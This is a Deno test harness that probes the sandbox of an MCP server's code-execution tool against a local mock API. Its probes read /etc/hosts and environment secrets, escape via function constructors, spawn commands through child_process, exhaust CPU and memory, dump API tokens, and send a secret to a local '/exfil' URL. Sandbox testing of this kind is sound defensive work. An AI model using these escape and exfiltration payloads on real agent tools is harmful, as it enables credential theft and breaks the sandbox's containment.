// Usage: deno run -A --no-config --node-modules-dir=none run-probes.ts <default|hardened> [probe ids...]
// Spawns the published @mux/mcp 16.2.0 server (stdio, local Deno code execution) and calls its `execute` tool.
// No Mux key is used: MUX_BASE_URL points the SDK at a mock Mux API served by this harness on port 41320,
// whose GET /video/v1/assets/:id plays the SPEC `lookup` role (200 ms delay, value = id * 2).
import { Client } from "npm:@modelcontextprotocol/sdk@1.20.2/client/index.js";
import { StdioClientTransport } from "npm:@modelcontextprotocol/sdk@1.20.2/client/stdio.js";

const HERE = new URL(".", import.meta.url).pathname;
const PKG = new URL("../../impls/stainless-mcp-codemode/npm/node_modules/@mux/mcp/index.js", import.meta.url).pathname;
const MOCK_PORT = 41320;
const mode = Deno.args[0] ?? "default";
const OUT = `${HERE}out/${mode === "default" ? "" : mode + "-"}`;
const wanted = new Set(Deno.args.slice(1));
const want = (id: string) => wanted.size === 0 || wanted.has(id);

let mockCalls = 0;
const mockLog: string[] = [];
const mock = Deno.serve({ port: MOCK_PORT, hostname: "127.0.0.1", onListen: () => {} }, async (req) => {
  const url = new URL(req.url);
  mockLog.push(`${req.method} ${url.pathname}${url.search} auth=${req.headers.get("authorization") ? "present" : "none"}`);
  const m = url.pathname.match(/^\/video\/v1\/assets\/([^/]+)$/);
  if (m) {
    mockCalls++;
    await new Promise((r) => setTimeout(r, 200));
    const id = Number(m[1]);
    return Response.json({ data: { id: m[1], value: id * 2 } });
  }
  return Response.json({ note: "mock received", path: url.pathname }, { status: 200 });
});

const args = [PKG];
if (mode === "hardened") args.push("--code-allow-http-gets", "--no-client-header-overrides");
const t0 = performance.now();
const transport = new StdioClientTransport({
  command: "node",
  args,
  env: {
    PATH: Deno.env.get("PATH")!,
    HOME: Deno.env.get("HOME")!,
    DENO_PATH: "/opt/homebrew/bin/deno",
    DENO_DIR: new URL("../../impls/stainless-mcp-codemode/deno-dir", import.meta.url).pathname,
    MUX_BASE_URL: `http://localhost:${MOCK_PORT}`,
    MUX_TOKEN_ID: "probe-token-id-not-real",
    MUX_TOKEN_SECRET: "probe-token-secret-not-real",
    PROBE_SECRET: "s3cr3t",
  },
  stderr: "pipe",
});
let serverLog = "";
const client = new Client({ name: "probe-harness", version: "1.0.0" });
await client.connect(transport);
(transport.stderr as any)?.on("data", (c: Uint8Array) => { serverLog += new TextDecoder().decode(c); });
const setupMs = Math.round(performance.now() - t0);
const serverPid = transport.pid!;

if (want("TOOLS")) {
  const tools = await client.listTools();
  Deno.writeTextFileSync(`${OUT}TOOLS.txt`, JSON.stringify(tools, null, 2) + `\n\ninstructions:\n${client.getInstructions()}\n`);
}

function tree(root: number) {
  const ps = new TextDecoder().decode(new Deno.Command("ps", { args: ["-A", "-o", "pid=,ppid=,rss="] }).outputSync().stdout);
  const rows = ps.trim().split("\n").map((l) => l.trim().split(/\s+/).map(Number));
  const kids = new Map<number, number[]>();
  for (const [pid, ppid] of rows) kids.set(ppid, [...(kids.get(ppid) ?? []), pid]);
  const rss = new Map(rows.map(([pid, , r]) => [pid, r * 1024]));
  const pids: number[] = [];
  const walk = (p: number) => { pids.push(p); for (const k of kids.get(p) ?? []) walk(k); };
  walk(root);
  return { total: pids.reduce((a, p) => a + (rss.get(p) ?? 0), 0), pids, rss };
}

// limitMs: the harness's own stop (SPEC: 120 s for P6/P7). On expiry it kills the server's Deno worker children.
async function run(code: string, limitMs = 125000) {
  const before = mockCalls;
  const s = performance.now();
  let killed = "";
  const guard = setTimeout(() => {
    const kids = tree(serverPid).pids.slice(1);
    killed = `harness stopped at ${limitMs} ms and killed worker pids ${kids.join(",")}`;
    for (const p of kids) try { Deno.kill(p, "SIGKILL"); } catch { /* gone */ }
  }, limitMs);
  let r: unknown;
  try {
    r = await client.callTool({ name: "execute", arguments: { code } }, undefined, { timeout: limitMs + 30000 });
  } catch (e) {
    r = { clientError: String(e) };
  }
  clearTimeout(guard);
  return { response: r, ms: Math.round(performance.now() - s), hostCalls: mockCalls - before, ...(killed && { killed }) };
}

function save(id: string, code: string, r: unknown, extra = "") {
  Deno.writeTextFileSync(`${OUT}${id}.txt`, `mode: ${mode}\ncode:\n${code}\n\nresult:\n${JSON.stringify(r, null, 2)}\n${extra}`);
  console.log(id, JSON.stringify(r).slice(0, 400));
}
async function probe(id: string, code: string, limitMs?: number) { if (want(id)) save(id, code, await run(code, limitMs)); }

const fn = (body: string) => `async function run(client) {\n${body}\n}`;

await probe("P1", fn(`  const r: any = await client.video.assets.retrieve("21");\n  console.log(r.value);\n  return r;`));
await probe("P1b", fn(`  return { ctor: client.constructor.name, baseURL: client.baseURL, keys: Object.keys(client.video) };`));

if (want("P2")) {
  const code = fn(`  console.log("A".repeat(200000));\n  return "RETURNED";`);
  const r = await run(code);
  const text = JSON.stringify(r.response);
  save("P2", code, { ms: r.ms, responseChars: text.length, aCount: (text.match(/A/g) ?? []).length, containsRETURNED: text.includes("RETURNED"), blocks: ((r.response as any)?.content ?? []).map((c: any) => c.text?.length) });
}

await probe("P3", fn(`  const res = await fetch("https://example.com");\n  return res.status;`));
await probe("P4", fn(`  return (globalThis as any).Deno.readTextFileSync("/etc/hosts");`));
await probe("P4b", fn(`  const spec = "node:fs";\n  const fs: any = await import(spec);\n  return fs.readFileSync("/etc/hosts", "utf8");`));
await probe("P4c", fn(`  const spec = "node:fs";\n  const fs: any = await import(spec);\n  return fs.readdirSync(".").slice(0, 20);`));
await probe("P5", fn(`  return (globalThis as any).process.env.PROBE_SECRET;`));
await probe("P5b", fn(`  return (globalThis as any).Deno.env.get("PROBE_SECRET");`));
await probe("P6", fn(`  while (true) {}`), 120000);
if (want("P6kill")) {
  const r = await run(fn(`  while (true) {}`), 8000);
  await new Promise((res) => setTimeout(res, 1000));
  let alive = true;
  try { Deno.kill(serverPid, "SIGCONT"); } catch { alive = false; }
  save("P6kill", "while (true) {} with the harness killing the worker after 8 s", r, `\nMCP server process alive afterwards: ${alive}\nserver stderr tail:\n${serverLog.slice(-3000)}\n`);
}

if (want("P7")) {
  const code = fn(`  const a: string[] = [];\n  while (true) a.push("x".repeat(1e6));`);
  let peak = 0, killed = "";
  const baseline = tree(serverPid).total;
  const start = performance.now();
  const sampler = setInterval(() => {
    const { total, pids, rss } = tree(serverPid);
    peak = Math.max(peak, total);
    if (!killed && total > 4 * 1024 ** 3) {
      const biggest = pids.slice(1).sort((a, b) => (rss.get(b) ?? 0) - (rss.get(a) ?? 0))[0];
      killed = `harness killed ${biggest} at ${Math.round(total / 1e6)} MB tree RSS after ${Math.round(performance.now() - start)} ms`;
      try { Deno.kill(biggest, "SIGKILL"); } catch { /* gone */ }
    }
  }, 50);
  const r = await run(code, 120000);
  clearInterval(sampler);
  const after = await run(fn(`  return "alive";`));
  save("P7", code, r, `\nbaseline tree RSS bytes: ${baseline}\npeak tree RSS bytes: ${peak}\n${killed}\nnext execution after P7: ${JSON.stringify(after)}\n`);
}

if (want("P8")) {
  const r1 = await run(fn(`  (globalThis as any).kept = 7;\n  return "set";`));
  const r2 = await run(fn(`  return typeof (globalThis as any).kept === "undefined" ? "gone" : (globalThis as any).kept;`));
  save("P8", "globalThis.kept = 7 / typeof kept", { first: r1, second: r2 });
}

await probe("P9", fn(`  const t = Date.now();\n  await Promise.all([1, 2, 3, 4, 5].map((i) => client.video.assets.retrieve(String(i))));\n  return Date.now() - t;`));
await probe("P10", fn(`  throw new Error("probe-boom");`));
await probe("P10b", fn(`  const x = 1;\n  const y = 2;\n  throw new Error("probe-boom line 4");`));

if (want("P11")) {
  const times: number[] = [];
  for (let i = 0; i < 20; i++) times.push((await run(fn(`  return 1 + 1;`))).ms);
  const s = [...times].sort((a, b) => a - b);
  save("P11", "return 1 + 1 (x20)", { times, median: (s[9] + s[10]) / 2, p90: s[17], setupMs });
}

await probe("P12a", fn(`  return String((this as any).constructor.constructor("return process")());`));
await probe("P12b", fn(`  return String((function (this: any) { return this; })().process);`));
await probe("P12c", fn(`  const F = (async function () {}).constructor as any;\n  const p = await F("return globalThis.process")();\n  return { pid: p.pid, platform: p.platform };`));
await probe("P12d", fn(`  const o = new (globalThis as any).Deno.Command("echo", { args: ["PWNED"] }).outputSync();\n  return new TextDecoder().decode(o.stdout);`));
await probe("P12e", fn(`  const spec = "node:child_process";\n  const cp: any = await import(spec);\n  return String(cp.execSync("echo PWNED"));`));

await probe("H1", fn(`  return await client.video.assets.create({ inputs: [] } as any);`));
await probe("H2", fn(`  const c: any = client;\n  const name = ["cre", "ate"].join("");\n  return await c.video.assets[name]({ inputs: [] });`));
await probe("X1", fn(`  const c: any = client;\n  return { tokenId: c.tokenId, tokenSecret: c.tokenSecret, envSecret: (globalThis as any).Deno.env.get("MUX_TOKEN_SECRET") };`));
await probe("X2", fn(`  const env = (globalThis as any).Deno.env.toObject();\n  return Object.keys(env).sort();`));
await probe("X3", fn(`  const res = await fetch("http://localhost:${MOCK_PORT}/exfil?secret=" + (globalThis as any).Deno.env.get("PROBE_SECRET"));\n  return res.status;`));

Deno.writeTextFileSync(`${OUT}mock-log.txt`, `--- run ${new Date().toISOString()} probes: ${[...wanted].join(" ")}\n` + mockLog.join("\n") + "\n", { append: true });
Deno.writeTextFileSync(`${OUT}server-log.txt`, serverLog.slice(-30000));
const spawned = tree(serverPid).pids;
await client.close();
for (const p of spawned) try { Deno.kill(p, "SIGTERM"); } catch { /* exited */ }
await mock.shutdown();
Deno.exit(0);
